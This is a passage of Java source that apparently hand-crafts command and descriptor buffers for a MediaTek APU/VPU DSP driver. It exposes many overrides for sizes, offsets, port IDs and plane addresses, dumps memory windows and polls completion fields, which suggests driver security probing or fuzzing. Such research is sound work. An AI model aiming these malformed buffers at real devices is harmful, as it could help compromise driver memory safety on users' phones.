            throw new IllegalStateException("input image too small: need 0x"
                + Integer.toHexString(totalNeeded) + " have "
                + buffer.capacity());
        }

        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
        buffer.put(0x10, (byte) 1);
        buffer.put(0x11, (byte) 0);
        putU64LE(buffer, 0x18, 0);
        putU32LE(buffer, 0x20, 1);
        putU32LE(buffer, 0x24, 0x5c);
        putU32LE(buffer, 0x28, 0x58);
        putU32LE(buffer, 0x2c, 0x30);

        int scOff = 0x30;
        putU32LE(buffer, scOff + 0x00, 0x03);
        putU32LE(buffer, scOff + 0x20, codebufSize);
        putU32LE(buffer, scOff + 0x24, codebufOffset);
        putU32LE(buffer, 0x58, 0);
        putU32LE(buffer, 0x5c, 0);

        int reqBase = codebufOffset;
        byte[] nameBytes = algoName.getBytes("US-ASCII");
        int nameLen = nameBytes.length < 0x1f ? nameBytes.length : 0x1f;
        for (int i = 0; i < nameLen; i++) {
            buffer.put(reqBase + 0x04 + i, nameBytes[i]);
        }

        int reqBufferCountBase = vpuDescriptorModeUsesFive(descriptorMode)
            ? 5 : (twoVpuBuffers ? 2 : 1);
        int reqBufferCount = requestBufferCountOverride != null
            ? requestBufferCountOverride : reqBufferCountBase;
        int requestSettingsLen = includeSettingsProperty ? settingsLen : 0;
        long requestSettingsIova = includeSettingsProperty
            ? iovaLow32(iovaAddr, XRP_SETTINGS_OFF) : 0;
        putU64LE(buffer, reqBase + 0x28, requestFlags & 0xffffffffL);
        buffer.put(reqBase + 0x35, (byte) reqBufferCount);
        putU32LE(buffer, reqBase + 0x38, requestSettingsLen);
        putU64LE(buffer, reqBase + 0x40, requestSettingsIova);
        if (requestPriorityOverride != null) {
            putU32LE(buffer, reqBase + 0xb68, requestPriorityOverride);
        }

        int codePayloadSize = xrpOp.hasCode() ? XRP_CODE_OP_SIZE : settingsLen;
        int codeDescriptorPayloadSize = descriptorPayloadSizeOverride != null
            ? descriptorPayloadSizeOverride : codePayloadSize;
        int settingsDescriptorPayloadSize = descriptorPayloadSizeOverride != null
            ? descriptorPayloadSizeOverride : settingsLen;
        VpuDescriptorPlaneOverride descriptorPlaneOverride =
            settingsShape.descriptorPlaneOverride;
        int outputPayloadOff = xrpOutputOff(xrpOp);
        int dataDescPayloadOff = xrpDataDescOff(xrpOp);
        int buf0PayloadOff = twoVpuBuffers ? XRP_CODE_OFF : planePayloadOff;
        int buf0PayloadSize = twoVpuBuffers
            ? codeDescriptorPayloadSize
            : (splitTargets ? XRP_PLANE_PAYLOAD_SIZE : XRP_DATA_PAYLOAD_SIZE);
        int buf1PayloadOff = outputPayloadOff;
        int buf1PayloadSize = XRP_OUTPUT_SIZE;
        if (twoVpuBuffers && descriptorOrder == VPU_DESC_ORDER_OUTPUT_CODE) {
            buf0PayloadOff = outputPayloadOff;
            buf0PayloadSize = XRP_OUTPUT_SIZE;
            buf1PayloadOff = XRP_CODE_OFF;
            buf1PayloadSize = codeDescriptorPayloadSize;
        }
        if (twoVpuBuffers && descriptorOrder != VPU_DESC_ORDER_CODE_OUTPUT
                && descriptorOrder != VPU_DESC_ORDER_OUTPUT_CODE) {
            throw new IllegalArgumentException("unknown descriptor order: "
                + descriptorOrder);
        }
        int legacyBuf0PayloadOff = twoVpuBuffers ? XRP_CODE_OFF : planePayloadOff;
        int legacyBuf0PayloadSize = twoVpuBuffers
            ? codeDescriptorPayloadSize
            : (splitTargets ? XRP_PLANE_PAYLOAD_SIZE : XRP_DATA_PAYLOAD_SIZE);
        if (descriptorMode == VPU_DESC_LIBVPU_SETTINGS5) {
            for (int i = 0; i < 5; i++) {
                putVpuBufferDescriptor(buffer, reqBase + 0x50 + (i * 0x40),
                    iovaAddr, XRP_SETTINGS_OFF, settingsDescriptorPayloadSize,
                    descriptorMode, descriptorPortIdOverride,
                    descriptorFormatOverride, descriptorPlaneCountOverride,
                    descriptorHeightOverride, descriptorPlaneOverride);
            }
        } else if (descriptorMode == VPU_DESC_LIBVPU_CODE5) {
            for (int i = 0; i < 5; i++) {
                putVpuBufferDescriptor(buffer, reqBase + 0x50 + (i * 0x40),
                    iovaAddr, XRP_CODE_OFF, codeDescriptorPayloadSize,
                    descriptorMode, descriptorPortIdOverride,
                    descriptorFormatOverride, descriptorPlaneCountOverride,
                    descriptorHeightOverride, descriptorPlaneOverride);
            }
        } else if (descriptorMode == VPU_DESC_LIBVPU_MIXED5
                || descriptorMode == VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST) {
            int[] payloadOffs;
            int[] payloadSizes;
            if (descriptorMode == VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST) {
                payloadOffs = new int[] {
                    outputPayloadOff,
                    XRP_CODE_OFF,
                    dataDescPayloadOff,
                    dataPayloadOff,
                    planePayloadOff,
                };
                payloadSizes = new int[] {
                    settingsShape.outputSize,
                    codeDescriptorPayloadSize,
                    settingsShape.dataDescSize,
                    XRP_DATA_PAYLOAD_SIZE,
                    XRP_PLANE_PAYLOAD_SIZE,
                };
            } else {
                payloadOffs = new int[] {
                    XRP_CODE_OFF,
                    outputPayloadOff,
                    dataDescPayloadOff,
                    dataPayloadOff,
                    planePayloadOff,
                };
                payloadSizes = new int[] {
                    codeDescriptorPayloadSize,
                    settingsShape.outputSize,
                    settingsShape.dataDescSize,
                    XRP_DATA_PAYLOAD_SIZE,
                    XRP_PLANE_PAYLOAD_SIZE,
                };
            }
            for (int i = 0; i < 5; i++) {
                putVpuBufferDescriptor(buffer, reqBase + 0x50 + (i * 0x40),
                    iovaAddr, payloadOffs[i], payloadSizes[i],
                    descriptorMode, descriptorPortIdOverride,
                    descriptorFormatOverride, descriptorPlaneCountOverride,
                    descriptorHeightOverride, descriptorPlaneOverride);
            }
        } else {
            putVpuBufferDescriptor(buffer, reqBase + 0x50, iovaAddr,
                buf0PayloadOff, buf0PayloadSize, descriptorMode,
                descriptorPortIdOverride, descriptorFormatOverride,
                descriptorPlaneCountOverride, descriptorHeightOverride,
                descriptorPlaneOverride);
        }

        if (twoVpuBuffers && !vpuDescriptorModeHasExplicitFiveLayout(
                descriptorMode)) {
            putVpuBufferDescriptor(buffer, reqBase + 0x90, iovaAddr,
                buf1PayloadOff, buf1PayloadSize, descriptorMode,
                descriptorPortIdOverride, descriptorFormatOverride,
                descriptorPlaneCountOverride, descriptorHeightOverride,
                descriptorPlaneOverride);
        }

        if (descriptorMode == VPU_DESC_LIBVPU_ALIAS5) {
            putVpuBufferDescriptor(buffer, reqBase + 0xd0, iovaAddr,
                legacyBuf0PayloadOff, legacyBuf0PayloadSize, descriptorMode,
                descriptorPortIdOverride, descriptorFormatOverride,
                descriptorPlaneCountOverride, descriptorHeightOverride,
                descriptorPlaneOverride);
            putVpuBufferDescriptor(buffer, reqBase + 0x110, iovaAddr,
                outputPayloadOff, XRP_OUTPUT_SIZE, descriptorMode,
                descriptorPortIdOverride, descriptorFormatOverride,
                descriptorPlaneCountOverride, descriptorHeightOverride,
                descriptorPlaneOverride);
            putVpuBufferDescriptor(buffer, reqBase + 0x150, iovaAddr,
                legacyBuf0PayloadOff, legacyBuf0PayloadSize, descriptorMode,
                descriptorPortIdOverride, descriptorFormatOverride,
                descriptorPlaneCountOverride, descriptorHeightOverride,
                descriptorPlaneOverride);
        }

        int loggedPlane0PayloadOff = firstVpuDescriptorPayloadOff(
            descriptorMode, descriptorOrder, buf0PayloadOff, outputPayloadOff);
        if (descriptorPlaneOverride != null
                && descriptorPlaneOverride.planeMvaOffset != null) {
            loggedPlane0PayloadOff =
                descriptorPlaneOverride.planeMvaOffset.intValue();
        }
        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input run_cmd " + label + " payload:"
            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
            + " sc0_off=0x30 sc0_type=0x3"
            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
            + " algo=" + algoName
            + " request_flags=0x" + Integer.toHexString(requestFlags)
            + (outerCodebufSizeOverride != null
                ? " outer_codebuf_size_override=0x"
                + Integer.toHexString(outerCodebufSizeOverride) : "")
            + (requestPriorityOverride != null
                ? " request_priority_override=0x"
                + Integer.toHexString(requestPriorityOverride) : "")
            + (requestBufferCountOverride != null
                ? " request_buffer_count_override=0x"
                + Integer.toHexString(requestBufferCountOverride) : "")
            + " req_buffer_count=" + reqBufferCount
            + " settings_property=" + includeSettingsProperty
            + " settings_iova=0x"
            + Long.toHexString(requestSettingsIova)
            + " settings_len=0x" + Integer.toHexString(requestSettingsLen)
            + " settings_buffer_len=0x" + Integer.toHexString(settingsLen)
            + " settings_cmd_flags=0x" + Integer.toHexString(cmdFlags)
            + " output_iova=0x"
            + Long.toHexString(iovaLow32(iovaAddr, xrpOutputOff(xrpOp)))
            + " data_desc_iova=0x"
            + Long.toHexString(iovaLow32(iovaAddr, xrpDataDescOff(xrpOp)))
            + " data_payload_iova=0x"
            + Long.toHexString(iovaLow32(iovaAddr, dataPayloadOff))
            + " plane0_mva=0x"
            + Long.toHexString(iovaLow32(iovaAddr, loggedPlane0PayloadOff))
            + (twoVpuBuffers
                && !vpuDescriptorModeHasExplicitFiveLayout(descriptorMode)
                ? " plane1_mva=0x"
                + Long.toHexString(iovaLow32(iovaAddr, buf1PayloadOff)) : "")
            + " split_targets=" + splitTargets
            + " two_vpu_buffers=" + twoVpuBuffers
            + " descriptor_mode=" + vpuDescriptorModeName(descriptorMode)
            + (descriptorPayloadSizeOverride != null
                ? " descriptor_payload_size_override=0x"
                + Integer.toHexString(descriptorPayloadSizeOverride) : "")
            + (descriptorPortIdOverride != null
                ? " descriptor_port_id_override=0x"
                + Integer.toHexString(descriptorPortIdOverride) : "")
            + (descriptorFormatOverride != null
                ? " descriptor_format_override=0x"
                + Integer.toHexString(descriptorFormatOverride) : "")
            + (descriptorPlaneCountOverride != null
                ? " descriptor_plane_count_override=0x"
                + Integer.toHexString(descriptorPlaneCountOverride) : "")
            + (descriptorHeightOverride != null
                ? " descriptor_height_override=0x"
                + Integer.toHexString(descriptorHeightOverride) : "")
            + (descriptorPlaneOverride != null
                ? " descriptor_plane_override="
                + descriptorPlaneOverride.toLogString() : "")
            + " descriptor_order=" + vpuDescriptorOrderName(descriptorOrder)
            + " xrp_opcode=" + xrpOp.opcode
            + " xrp_name=" + xrpOp.name
            + " xrp_inputs=" + xrpOp.inputCount
            + " xrp_outputs=" + xrpOp.outputCount
            + " xrp_operand_off=0x"
            + Integer.toHexString(xrpOp.operandListOffset)
            + " xrp_operands=" + xrpOperandListText(xrpOp)
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static int firstVpuDescriptorPayloadOff(int descriptorMode,
                                                    int descriptorOrder,
                                                    int defaultPayloadOff,
                                                    int outputPayloadOff) {
        if (descriptorMode == VPU_DESC_LIBVPU_SETTINGS5) {
            return XRP_SETTINGS_OFF;
        }
        if (descriptorMode == VPU_DESC_LIBVPU_CODE5
                || descriptorMode == VPU_DESC_LIBVPU_MIXED5) {
            return XRP_CODE_OFF;
        }
        if (descriptorMode == VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST) {
            return outputPayloadOff;
        }
        if (descriptorOrder == VPU_DESC_ORDER_OUTPUT_CODE) {
            return outputPayloadOff;
        }
        return defaultPayloadOff;
    }

    private static String vpuDescriptorModeName(int descriptorMode) {
        if (descriptorMode == VPU_DESC_LIBVPU) {
            return "libvpu_metadata";
        }
        if (descriptorMode == VPU_DESC_LIBVPU_ALIAS5) {
            return "libvpu_metadata_alias5";
        }
        if (descriptorMode == VPU_DESC_LIBVPU_CODE5) {
            return "libvpu_metadata_code5";
        }
        if (descriptorMode == VPU_DESC_LIBVPU_MIXED5) {
            return "libvpu_metadata_mixed5";
        }
        if (descriptorMode == VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST) {
            return "libvpu_metadata_mixed5_output_first";
        }
        if (descriptorMode == VPU_DESC_LIBVPU_SETTINGS5) {
            return "libvpu_metadata_settings5";
        }
        return "minimal";
    }

    private static boolean vpuDescriptorModeUsesFive(int descriptorMode) {
        return descriptorMode == VPU_DESC_LIBVPU_ALIAS5
            || descriptorMode == VPU_DESC_LIBVPU_CODE5
            || descriptorMode == VPU_DESC_LIBVPU_MIXED5
            || descriptorMode == VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST
            || descriptorMode == VPU_DESC_LIBVPU_SETTINGS5;
    }

    private static boolean vpuDescriptorModeHasExplicitFiveLayout(
            int descriptorMode) {
        return descriptorMode == VPU_DESC_LIBVPU_CODE5
            || descriptorMode == VPU_DESC_LIBVPU_MIXED5
            || descriptorMode == VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST
            || descriptorMode == VPU_DESC_LIBVPU_SETTINGS5;
    }

    private static String vpuDescriptorModeDescription(int descriptorMode,
                                                       int descriptorOrder) {
        if (descriptorMode == VPU_DESC_LIBVPU_CODE5) {
            return "all five buffers point to XRP code/input.";
        }
        if (descriptorMode == VPU_DESC_LIBVPU_SETTINGS5) {
            return "all five buffers point to the wrapper DSP command/settings"
                + " buffer.";
        }
        if (descriptorMode == VPU_DESC_LIBVPU_MIXED5) {
            return "five buffers point to code, output, data descriptor,"
                + " data payload, and plane payload.";
        }
        if (descriptorMode == VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST) {
            return "five buffers point to output, code, data descriptor,"
                + " data payload, and plane payload.";
        }
        return vpuDescriptorOrderDescription(descriptorOrder);
    }

    private static String vpuDescriptorOrderName(int descriptorOrder) {
        if (descriptorOrder == VPU_DESC_ORDER_OUTPUT_CODE) {
            return "output_first";
        }
        return "code_first";
    }

    private static String vpuDescriptorOrderDescription(int descriptorOrder) {
        if (descriptorOrder == VPU_DESC_ORDER_OUTPUT_CODE) {
            return "buf0 plane points to XRP output,"
                + " buf1 plane points to XRP code/input.";
        }
        return "buf0 plane points to XRP code/input,"
            + " buf1 plane points to XRP output.";
    }

    private static void putVpuBufferDescriptor(java.nio.ByteBuffer buffer,
                                               int off,
                                               int baseIova,
                                               int payloadOff,
                                               int payloadSize,
                                               int descriptorMode,
                                               Integer descriptorPortIdOverride,
                                               Integer descriptorFormatOverride,
                                               Integer descriptorPlaneCountOverride,
                                               Integer descriptorHeightOverride,
                                               VpuDescriptorPlaneOverride descriptorPlaneOverride) {
        boolean libvpuShape = descriptorMode != VPU_DESC_MINIMAL;
        int portId = descriptorPortIdOverride != null
            ? descriptorPortIdOverride : (libvpuShape ? 1 : 0);
        int format = descriptorFormatOverride != null
            ? descriptorFormatOverride : 0;
        int planeCount = descriptorPlaneCountOverride != null
            ? descriptorPlaneCountOverride : 1;
        int height = descriptorHeightOverride != null
            ? descriptorHeightOverride : (libvpuShape ? 1 : 0);
        buffer.put(off + 0x00, (byte) portId);                // port_id
        buffer.put(off + 0x01, (byte) format);                // format/direction
        buffer.put(off + 0x02, (byte) planeCount);            // plane_count
        putU32LE(buffer, off + 0x04, payloadSize);            // width
        putU32LE(buffer, off + 0x08, height);                 // height
        putU32LE(buffer, off + 0x10, libvpuShape ? payloadSize : 0);
        putU32LE(buffer, off + 0x14, payloadSize);            // length
        putU64LE(buffer, off + 0x18, iovaLow32(baseIova, payloadOff));
        if (descriptorPlaneOverride == null) {
            return;
        }
        if (descriptorPlaneOverride.planeMvaOffset != null) {
            putU64LE(buffer, off + 0x18,
                iovaLow32(baseIova,
                    descriptorPlaneOverride.planeMvaOffset.intValue()));
        }
        if (descriptorPlaneOverride.word20 != null) {
            putU32LE(buffer, off + 0x20,
                descriptorPlaneOverride.word20.intValue());
        }
        if (descriptorPlaneOverride.word24 != null) {
            putU32LE(buffer, off + 0x24,
                descriptorPlaneOverride.word24.intValue());
        }
        if (descriptorPlaneOverride.word28 != null) {
            putU32LE(buffer, off + 0x28,
                descriptorPlaneOverride.word28.intValue());
        }
        if (descriptorPlaneOverride.word34 != null) {
            putU32LE(buffer, off + 0x34,
                descriptorPlaneOverride.word34.intValue());
        }
        if (descriptorPlaneOverride.byte38 != null) {
            buffer.put(off + 0x38,
                (byte) (descriptorPlaneOverride.byte38.intValue() & 0xff));
        }
        if (descriptorPlaneOverride.byte39 != null) {
            buffer.put(off + 0x39,
                (byte) (descriptorPlaneOverride.byte39.intValue() & 0xff));
        }
        if (descriptorPlaneOverride.byte3a != null) {
            buffer.put(off + 0x3a,
                (byte) (descriptorPlaneOverride.byte3a.intValue() & 0xff));
        }
        if (descriptorPlaneOverride.byte3b != null) {
            buffer.put(off + 0x3b,
                (byte) (descriptorPlaneOverride.byte3b.intValue() & 0xff));
        }
    }

    private static void fillXrpSettingsBuffer(java.nio.ByteBuffer buffer,
                                              int iovaAddr,
                                              int iovaSize,
                                              XrpOpSpec xrpOp,
                                              int cmdFlags,
                                              int outputHeaderFlag,
                                              XrpSettingsShape settingsShape,
                                              Integer dataPayloadWordBaseOverride,
                                              XrpDataDescEntry[] dataDescEntriesOverride) {
        int outputOff = xrpOutputOff(xrpOp);
        int dataDescOff = xrpDataDescOff(xrpOp);
        int dataPayloadOff = xrpDataPayloadOff(xrpOp);
        int planePayloadOff = xrpPlanePayloadOff(xrpOp);
        int required = planePayloadOff + XRP_PLANE_PAYLOAD_SIZE;
        if (buffer.capacity() < required) {
            throw new IllegalStateException("settings image too small: need 0x"
                + Integer.toHexString(required) + " have "
                + buffer.capacity());
        }
        if (iovaSize < required) {
            throw new IllegalStateException("imported IOVA too small: need 0x"
                + Integer.toHexString(required) + " have 0x"
                + Integer.toHexString(iovaSize));
        }

        int clearLen = buffer.capacity() < 0x800 ? buffer.capacity() : 0x800;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }

        int s = XRP_SETTINGS_OFF;
        int codeSize = settingsShape.codeSizeOverride != null
            ? settingsShape.codeSizeOverride
            : (xrpOp.hasCode() ? XRP_CODE_OP_SIZE : XRP_CODE_SIZE_ZERO);
        putU32LE(buffer, s + 0x00, cmdFlags);
        putU32LE(buffer, s + 0x04, codeSize);
        putU32LE(buffer, s + 0x08, settingsShape.outputSize);
        putU32LE(buffer, s + 0x0c, settingsShape.dataDescSize);
        putU32LE(buffer, s + 0x10, (int) iovaLow32(iovaAddr, XRP_CODE_OFF));
        putU32LE(buffer, s + 0x20, (int) iovaLow32(iovaAddr, outputOff));
        putU32LE(buffer, s + 0x30, settingsShape.includeDataDesc
            ? (int) iovaLow32(iovaAddr, dataDescOff) : 0);
        for (int i = 0; i < XRP_CMD_MAGIC.length; i++) {
            buffer.put(s + 0x40 + i, XRP_CMD_MAGIC[i]);
        }
        putU32LE(buffer, s + 0x50, 0);
        putU32LE(buffer, s + 0x54, 0);

        if (xrpOp.hasCode()) {
            int op = XRP_CODE_OFF;
            putU16LE(buffer, op + 0x00, xrpOp.opcode);
            putU32LE(buffer, op + 0x04, XRP_CODE_OP_SIZE);
            putU32LE(buffer, op + 0x08, xrpOp.operandListOffset);
            putU32LE(buffer, op + 0x0c, xrpOp.inputCount);
            putU32LE(buffer, op + 0x10, xrpOp.outputCount);
            for (int i = 0; i < xrpOp.operandIds.length; i++) {
                putU16LE(buffer,
                    op + 0x48 + xrpOp.operandListOffset + (i * 2),
                    xrpOp.operandIds[i]);
            }
        }

        int out = outputOff;
        putU32LE(buffer, out + 0x00, -1);
        putU32LE(buffer, out + 0x04, 0x40);
        putU32LE(buffer, out + 0x08, 4);
        putU32LE(buffer, out + 0x0c, settingsShape.outputSize);
        putU32LE(buffer, out + 0x10, outputHeaderFlag);

        if (settingsShape.includeDataDesc) {
            if (dataDescEntriesOverride != null
                    && dataDescEntriesOverride.length * XRP_DATA_DESC_SIZE
                    > settingsShape.dataDescSize) {
                throw new IllegalArgumentException("data descriptor override"
                    + " exceeds declared size");
            }
            int data = dataDescOff;
            if (dataDescEntriesOverride != null) {
                for (int i = 0; i < dataDescEntriesOverride.length; i++) {
                    XrpDataDescEntry entry = dataDescEntriesOverride[i];
                    int entryOff = data + (i * XRP_DATA_DESC_SIZE);
                    putU32LE(buffer, entryOff + 0x00, entry.flags);
                    putU32LE(buffer, entryOff + 0x04, entry.size);
                    putU32LE(buffer, entryOff + 0x08,
                        (int) iovaLow32(iovaAddr, entry.iovaOffset));
                }
            } else {
                putU32LE(buffer, data + 0x00, 3);
                putU32LE(buffer, data + 0x04, XRP_DATA_PAYLOAD_SIZE);
                putU32LE(buffer, data + 0x08,
                    (int) iovaLow32(iovaAddr, dataPayloadOff));
            }
        }

        int payload = dataPayloadOff;
        int dataPayloadWordBase = dataPayloadWordBaseOverride != null
            ? dataPayloadWordBaseOverride : 0x41505530;
        for (int off = 0; off < XRP_DATA_PAYLOAD_SIZE; off += 4) {
            putU32LE(buffer, payload + off, dataPayloadWordBase + (off / 4));
        }
        for (int off = 0; off < XRP_PLANE_PAYLOAD_SIZE; off += 4) {
            putU32LE(buffer, planePayloadOff + off, 0x504c4e30 + (off / 4));
        }

        System.out.println("[+] XRP settings buffer initialized:"
            + " settings_off=0x" + Integer.toHexString(XRP_SETTINGS_OFF)
            + " cmd_flags=0x" + Integer.toHexString(cmdFlags)
            + " code_off=0x" + Integer.toHexString(XRP_CODE_OFF)
            + " code_size=0x" + Integer.toHexString(codeSize)
            + " settings_shape=" + settingsShape.label
            + " output_size=0x" + Integer.toHexString(settingsShape.outputSize)
            + " data_desc_size=0x"
            + Integer.toHexString(settingsShape.dataDescSize)
            + " opcode=" + xrpOp.opcode
            + " op_name=" + xrpOp.name
            + " inputs=" + xrpOp.inputCount
            + " outputs=" + xrpOp.outputCount
            + " operand_off=0x"
            + Integer.toHexString(xrpOp.operandListOffset)
            + " operands=" + xrpOperandListText(xrpOp)
            + " output_off=0x" + Integer.toHexString(outputOff)
            + " output_header_flag=0x"
            + Integer.toHexString(outputHeaderFlag)
            + " data_desc_off=0x" + Integer.toHexString(dataDescOff)
            + " data_payload_off=0x" + Integer.toHexString(dataPayloadOff)
            + " data_payload_word_base=0x"
            + Integer.toHexString(dataPayloadWordBase)
            + (dataDescEntriesOverride != null
                ? " data_desc_entries="
                + dataDescEntriesText(dataDescEntriesOverride) : "")
            + " plane_payload_off=0x" + Integer.toHexString(planePayloadOff)
            + " base_iova=0x" + Integer.toHexString(iovaAddr));
    }

    private static long iovaLow32(int base, int off) {
        return ((long) (base + off)) & 0xffffffffL;
    }

    private static XrpOpSpec requireXrpOpSpec(String label) {
        for (int i = 0; i < XRP_OP_MATRIX.length; i++) {
            XrpOpSpec spec = XRP_OP_MATRIX[i];
            if (spec.label.equals(label)) {
                return spec;
            }
        }
        for (int i = 0; i < XRP_OP_EXTRA_CASES.length; i++) {
            XrpOpSpec spec = XRP_OP_EXTRA_CASES[i];
            if (spec.label.equals(label)) {
                return spec;
            }
        }
        throw new IllegalArgumentException("unknown XRP op case '" + label
            + "'; valid labels: " + xrpOpLabelsText());
    }

    private static String xrpOpLabelsText() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < XRP_OP_MATRIX.length; i++) {
            if (i != 0) {
                sb.append(',');
            }
            sb.append(XRP_OP_MATRIX[i].label);
        }
        for (int i = 0; i < XRP_OP_EXTRA_CASES.length; i++) {
            if (sb.length() != 0) {
                sb.append(',');
            }
            sb.append(XRP_OP_EXTRA_CASES[i].label);
        }
        return sb.toString();
    }

    private static String xrpOperandListText(XrpOpSpec xrpOp) {
        if (xrpOp.operandIds.length == 0) {
            return "[]";
        }
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        for (int i = 0; i < xrpOp.operandIds.length; i++) {
            if (i != 0) {
                sb.append(',');
            }
            sb.append(xrpOp.operandIds[i]);
        }
        sb.append(']');
        return sb.toString();
    }

    private static String dataDescEntriesText(XrpDataDescEntry[] entries) {
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        for (int i = 0; i < entries.length; i++) {
            if (i != 0) {
                sb.append(',');
            }
            XrpDataDescEntry entry = entries[i];
            sb.append("{flags=0x");
            sb.append(Integer.toHexString(entry.flags));
            sb.append(",size=0x");
            sb.append(Integer.toHexString(entry.size));
            sb.append(",iova_off=0x");
            sb.append(Integer.toHexString(entry.iovaOffset));
            sb.append('}');
        }
        sb.append(']');
        return sb.toString();
    }

    private static int xrpOutputOff(XrpOpSpec xrpOp) {
        return xrpOp.hasCode() ? XRP_NZ_OUTPUT_OFF : XRP_OUTPUT_OFF;
    }

    private static int xrpDataDescOff(XrpOpSpec xrpOp) {
        return xrpOp.hasCode() ? XRP_NZ_DATA_DESC_OFF : XRP_DATA_DESC_OFF;
    }

    private static int xrpDataPayloadOff(XrpOpSpec xrpOp) {
        return xrpOp.hasCode() ? XRP_NZ_DATA_PAYLOAD_OFF : XRP_DATA_PAYLOAD_OFF;
    }

    private static int xrpPlanePayloadOff(XrpOpSpec xrpOp) {
        return xrpOp.hasCode() ? XRP_NZ_PLANE_PAYLOAD_OFF : XRP_PLANE_PAYLOAD_OFF;
    }

    private static void dumpXrpWindows(String phase, java.nio.ByteBuffer buf,
                                       XrpOpSpec xrpOp) {
        dumpByteBufferRange("xrp_" + phase + "_settings",
            buf, XRP_SETTINGS_OFF, 0x80);
        if (xrpOp.hasCode()) {
            dumpByteBufferRange("xrp_" + phase + "_code",
                buf, XRP_CODE_OFF, XRP_CODE_OP_SIZE);
        }
        dumpByteBufferRange("xrp_" + phase + "_output",
            buf, xrpOutputOff(xrpOp), 0x80);
        dumpByteBufferRange("xrp_" + phase + "_data_desc",
            buf, xrpDataDescOff(xrpOp), 0x40);
        dumpByteBufferRange("xrp_" + phase + "_data_payload",
            buf, xrpDataPayloadOff(xrpOp), 0x80);
        dumpByteBufferRange("xrp_" + phase + "_plane_payload",
            buf, xrpPlanePayloadOff(xrpOp), 0x80);
    }

    private static final class CompletionPollSnapshot {
        final int[] values = new int[XRP_COMPLETION_POLL_FIELDS.length];

        CompletionPollSnapshot(java.nio.ByteBuffer buf, XrpOpSpec xrpOp) {
            int outputOff = xrpOutputOff(xrpOp);
            int dataDescOff = xrpDataDescOff(xrpOp);
            values[0] = getU32LE(buf, XRP_SETTINGS_OFF);
            values[1] = getU32LE(buf, XRP_SETTINGS_OFF + 0x30);
            values[2] = getU32LE(buf, outputOff);
            values[3] = getU32LE(buf, outputOff + 0x10);
            values[4] = getU32LE(buf, outputOff + 0x3c);
            values[5] = getU32LE(buf, dataDescOff);
        }
    }

    private static void dumpCompletionPollSnapshot(
            String name, CompletionPollSnapshot snapshot) {
        StringBuilder sb = new StringBuilder();
        sb.append("    ").append(name).append(":");
        for (int i = 0; i < XRP_COMPLETION_POLL_FIELDS.length; i++) {
            sb.append(' ').append(XRP_COMPLETION_POLL_FIELDS[i])
              .append("=0x").append(Integer.toHexString(snapshot.values[i]));
        }
        System.out.println(sb.toString());
    }

    private static void pollXrpCompletionWindow(
            String label, java.nio.ByteBuffer buf, XrpOpSpec xrpOp,
            CompletionPollSnapshot before) {
        long[] firstNs = new long[XRP_COMPLETION_POLL_FIELDS.length];
        int[] firstValues = new int[XRP_COMPLETION_POLL_FIELDS.length];
        for (int i = 0; i < firstNs.length; i++) {
            firstNs[i] = Long.MIN_VALUE;
        }

        long startNs = System.nanoTime();
        CompletionPollSnapshot current =
            new CompletionPollSnapshot(buf, xrpOp);
        int changed = recordCompletionPollChanges(label, before, current,
            firstNs, firstValues, 0, 0);
        int samples = 1;

        while (changed < XRP_COMPLETION_POLL_FIELDS.length
                && samples < XRP_COMPLETION_POLL_MAX_SAMPLES) {
            long elapsedNs = System.nanoTime() - startNs;
            if (elapsedNs >= XRP_COMPLETION_POLL_BUDGET_NS) {
                break;
            }
            current = new CompletionPollSnapshot(buf, xrpOp);
            changed += recordCompletionPollChanges(label, before, current,
                firstNs, firstValues, elapsedNs, samples);
            samples++;
        }

        long elapsedNs = System.nanoTime() - startNs;
        CompletionPollSnapshot after = new CompletionPollSnapshot(buf, xrpOp);
        dumpCompletionPollSnapshot("completion_poll_after", after);

        int firstSampleChanged = 0;
        for (int i = 0; i < firstNs.length; i++) {
            if (firstNs[i] == 0) {
                firstSampleChanged++;
            }
        }
        StringBuilder sb = new StringBuilder();
        sb.append("[+] completion_poll_summary label=").append(label)
          .append(" samples=").append(samples)
          .append(" elapsed_ns=").append(elapsedNs)
          .append(" changed_fields=").append(changed)
          .append(" first_sample_changed=").append(firstSampleChanged);
        for (int i = 0; i < XRP_COMPLETION_POLL_FIELDS.length; i++) {
            sb.append(' ').append(XRP_COMPLETION_POLL_FIELDS[i])
              .append("_ns=").append(completionPollNsText(firstNs[i]))
              .append(" final=0x")
              .append(Integer.toHexString(after.values[i]));
        }
        System.out.println(sb.toString());
    }

    private static int recordCompletionPollChanges(
            String label, CompletionPollSnapshot before,
            CompletionPollSnapshot current, long[] firstNs, int[] firstValues,
            long elapsedNs, int sampleIndex) {
        int changed = 0;
        for (int i = 0; i < XRP_COMPLETION_POLL_FIELDS.length; i++) {
            if (firstNs[i] != Long.MIN_VALUE) {
                continue;
            }
            if (current.values[i] == before.values[i]) {
                continue;
            }
            firstNs[i] = elapsedNs;
            firstValues[i] = current.values[i];
            changed++;
            System.out.println("[*] completion_poll_change label=" + label
                + " field=" + XRP_COMPLETION_POLL_FIELDS[i]
                + " sample=" + sampleIndex
                + " delta_ns=" + elapsedNs
                + " old=0x" + Integer.toHexString(before.values[i])
                + " new=0x" + Integer.toHexString(firstValues[i]));
        }
        return changed;
    }

    private static String completionPollNsText(long value) {
        if (value == Long.MIN_VALUE) {
            return "not_seen";
        }
        return Long.toString(value);
    }

    private static void dumpVpuCommandWindows(String phase,
                                              java.nio.ByteBuffer buf) {
        dumpByteBufferRange("vpu_cmd_" + phase + "_apusys_header",
            buf, 0x00, 0x80);
